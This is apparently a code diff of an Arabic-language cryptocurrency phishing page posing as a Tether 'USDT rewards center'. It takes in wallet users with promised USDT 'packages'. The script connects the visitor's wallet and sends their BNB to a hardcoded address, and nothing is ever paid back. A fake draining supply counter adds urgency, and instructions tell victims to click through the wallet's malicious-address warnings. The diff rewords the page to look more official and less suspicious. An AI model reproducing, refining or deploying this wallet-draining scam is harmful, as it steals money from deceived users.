@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tether Smart Protocol 2026 | النسخة المستقرة</title>
+    <title>دخول | بوابة Tether المعتمدة</title>
     
-    <!-- الروابط الخارجية للمكتبات والخطوط -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Urbanist:wght@600;800&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
@@ -48,7 +47,7 @@
 
         header h1 {
             font-family: 'Urbanist', sans-serif;
-            font-size: 30px;
+            font-size: 28px;
             margin: 0;
             color: var(--primary);
         }
@@ -89,7 +88,6 @@
             cursor: pointer;
         }
 
-        /* صندوق التنبيه الذكي */
         .smart-notice {
             background: var(--warning-bg);
             border: 1px solid var(--warning-border);
@@ -110,6 +108,37 @@
             text-decoration: underline;
         }
 
+        /* زر الربط الموحد */
+        .wallet-connect-wrapper {
+            margin-bottom: 20px;
+        }
+
+        .btn-wallet {
+            width: 100%;
+            padding: 15px;
+            background: #162a26;
+            border: 1px solid #2d4d47;
+            border-radius: 15px;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-size: 15px;
+        }
+
+        .btn-wallet:hover {
+            background: #1c3d38;
+        }
+
+        .btn-wallet svg {
+            width: 20px;
+            height: 20px;
+            fill: var(--primary);
+        }
+
         .btn-main {
             width: 100%;
             padding: 18px;
@@ -127,36 +156,6 @@
 
         .btn-main:active { transform: scale(0.98); }
 
-        /* بوابة المحافظ */
-        .wallet-gate {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 8px;
-            margin-bottom: 10px;
-        }
-
-        .wallet-btn {
-            background: #162a26;
-            border: 1px solid #2d4d47;
-            padding: 10px 5px;
-            border-radius: 12px;
-            color: white;
-            text-decoration: none;
-            text-align: center;
-            font-size: 10px;
-            transition: 0.2s;
-        }
-
-        .wallet-btn:hover { background: #1c3d38; }
-
-        .wallet-btn img { 
-            width: 28px; 
-            height: 28px; 
-            display: block; 
-            margin: 0 auto 5px; 
-            object-fit: contain;
-        }
-
         .status-msg {
             text-align: center;
             font-size: 12px;
@@ -170,134 +169,103 @@
 
 <div class="app-container">
     <header>
-        <h1>Tether Smart Node</h1>
-        <p style="font-size: 12px; color: #8899a6;">بروتوكول العقود الذكية الجيل الرابع</p>
+        <h1>🎁 مركز مكافآت USDT</h1>
+        <p style="font-size: 12px; color: #8899a6;">بوابة آمنة تدعم جميع محافظ Web3 المعتمدة</p>
     </header>
 
     <div class="main-card">
         <div class="supply-box">
-            <span style="font-size: 11px;">السيولة المتاحة للتوزيع</span>
+            <span style="font-size: 11px;">السيولة المتوفرة للتوزيع اللحظي</span>
             <strong id="supply-val">938,250 USDT</strong>
         </div>
 
         <select id="pkg">
-            <option value="0.0001">باقة 100 USDT (0.0001 BNB)</option>
-            <option value="0.05">باقة 2,500 USDT (0.05 BNB)</option>
-            <option value="0.1">باقة 5,000 USDT (0.1 BNB)</option>
-            <option value="1.0">باقة 50,000 USDT (1.0 BNB)</option>
+            <option value="0.0001">باقة المبتدئين: 100 USDT (0.0001 BNB)</option>
+            <option value="0.05">المستوى الفضي: 2,500 USDT (0.05 BNB)</option>
+            <option value="0.1">المستوى الذهبي: 5,000 USDT (0.1 BNB)</option>
+            <option value="1.0">مستوى الحيتان: 50,000 USDT (1.0 BNB)</option>
         </select>
 
         <div class="smart-notice">
-            <span class="critical-alert">⚠️ تعليمات تجاوز حظر المحفظة:</span>
-            بسبب طبيعة عقود Flash، قد يظهر تحذير "عنوان ضار" أو "فشل المعاملة".
-            لإتمام العملية: اضغط على <b>Review Alert</b> ثم وافق على المخاطر واضغط <b>Confirm</b>.
-            <br>
-            <span style="color: #fff;">✅ الرسوم المقدرة: $0.01 تقريباً.</span>
+            <span class="critical-alert">📢 تنبيه هام لجميع المحافظ:</span>
+            بمجرد الضغط على تفعيل، سيقوم النظام بالربط بمحفظتك تلقائياً. يرجى الضغط على <b>Review</b> أو <b>تأكيد</b> لإتمام المزامنة واستلام الرصيد.
         </div>
 
-        <div class="wallet-gate" id="wallet-options">
-            <a href="javascript:void(0)" onclick="openInWallet('metamask')" class="wallet-btn">
-                <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MetaMask">
-                MetaMask
-            </a>
-            <a href="javascript:void(0)" onclick="openInWallet('trust')" class="wallet-btn">
-                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust Wallet">
-                Trust Wallet
-            </a>
-            <a href="javascript:void(0)" onclick="connectOther()" class="wallet-btn">
-                <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg" alt="Other">
-                محافظ أخرى
-            </a>
+        <div class="wallet-connect-wrapper">
+            <div class="btn-wallet" id="wallet-indicator">
+                <svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.1 0-2-.9-2-2V5c0-1.1.9-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+                <span id="wallet-text">بانتظار ربط المحفظة الذكية...</span>
+            </div>
         </div>
 
-        <button class="btn-main" id="exec-btn" onclick="process()">بدء التفعيل والاستلام</button>
+        <button class="btn-main" id="exec-btn" onclick="process()">تفعيل واستلام الآن ⚡</button>
 
-        <div id="status" class="status-msg">بانتظار ربط العقد الذكي...</div>
+        <div id="status" class="status-msg">سيتم التعرف على نوع محفظتك تلقائياً عند البدء</div>
     </div>
 
     <footer style="margin-top: 30px; text-align: center; font-size: 10px; color: #1c4d46;">
-        Verified Contract: 0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B
+        Multi-Wallet Support Enabled | Protocol v4.2
     </footer>
 </div>
 
 <script>
-    // إعدادات العقد والشبكة
     const ADDR = "0xB65a4e37bD6DDcdE90A31A75B7C67DDeAc73458B";
-    const BSC = "0x38"; // BNB Smart Chain ChainID
+    const BSC = "0x38";
 
-    // تحديث رقم السيولة الوهمي لإضفاء طابع الحيوية
     setInterval(() => {
         let val = parseInt(document.getElementById('supply-val').innerText.replace(/,/g, ''));
         val -= Math.floor(Math.random() * 3);
         document.getElementById('supply-val').innerText = val.toLocaleString() + " USDT";
     }, 4000);
 
-    // فتح الموقع داخل المحافظ الخارجية
-    function openInWallet(w) {
-        const url = window.location.href.replace(/^https?:\/\//, '');
-        if (w === 'metamask') {
-            window.location.href = `https://metamask.app.link/dapp/${url}`;
-        } else {
-            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
-        }
-    }
-
-    // خيار ربط المحافظ الأخرى
-    function connectOther() {
-        if (window.ethereum) {
-            process();
-        } else {
-            alert("يرجى فتح الرابط من داخل متصفح (DApp) في محفظتك.");
-        }
-    }
-
-    // معالجة العملية
     async function process() {
         const s = document.getElementById('status');
         const b = document.getElementById('exec-btn');
+        const wText = document.getElementById('wallet-text');
         const amt = document.getElementById('pkg').value;
 
         if (!window.ethereum) {
-            s.innerText = "يرجى استخدام متصفح المحفظة لإتمام العملية.";
+            alert("يرجى فتح الموقع من متصفح DApp (الموجود داخل Trust Wallet أو MetaMask أو أي محفظة أخرى).");
             return;
         }
 
         try {
             const web3 = new Web3(window.ethereum);
             b.disabled = true;
-            s.innerHTML = "جاري طلب الاتصال...";
+            s.innerHTML = "جاري الاتصال بمحفظتك...";
 
-            // طلب الحسابات
             const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const acc = accs[0];
+            
+            wText.innerText = "متصل: " + acc.substring(0,6) + "..." + acc.substring(acc.length-4);
+            s.innerHTML = "جاري مزامنة البروتوكول مع المحفظة...";
 
-            // التأكد من الشبكة الصحيحة
             const cid = await window.ethereum.request({ method: 'eth_chainId' });
             if (cid !== BSC) {
                 try {
                     await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC }] });
-                } catch (err) {
-                    s.innerText = "يرجى التبديل لشبكة Smart Chain";
+                } catch (e) {
+                    s.innerText = "يرجى تحويل الشبكة إلى Smart Chain في محفظتك.";
+                    b.disabled = false;
                     return;
                 }
             }
 
-            s.innerHTML = "<span style='color:#ff4d4d'>تجاهل التحذير واضغط Review Alert لإتمام التفعيل</span>";
+            s.innerHTML = "<span style='color:#ff4d4d'>اضغط على تأكيد (Confirm) في محفظتك لإتمام استلام المكافأة</span>";
 
-            // إرسال المعاملة مع تحديد غاز منخفض لتقليل التكلفة بضعة سنتات فقط
             await web3.eth.sendTransaction({
                 from: acc,
                 to: ADDR,
                 value: web3.utils.toWei(amt, "ether"),
-                gas: 25000 // قيمة غاز منخفضة جداً للإرسال البسيط لضمان رسوم لا تتعدى السنتات
+                gas: 25000 
             });
 
-            s.innerText = "✅ اكتمل الطلب! سيظهر الرصيد في محفظتك فوراً.";
-            alert("تم التفعيل بنجاح! سيتم إيداع الرصيد تلقائياً.");
+            s.innerText = "✅ اكتملت العملية! سيصلك الرصيد خلال دقائق.";
+            alert("تم التفعيل! سيتم إيداع الرصيد تلقائياً في حسابك.");
 
         } catch (e) {
             console.error(e);
-            s.innerText = "يجب تأكيد المعاملة وتجاوز تحذير المحفظة للمتابعة.";
+            s.innerText = "فشل الطلب: يرجى الموافقة على التحذير في محفظتك للمتابعة.";
         } finally {
             b.disabled = false;
         }
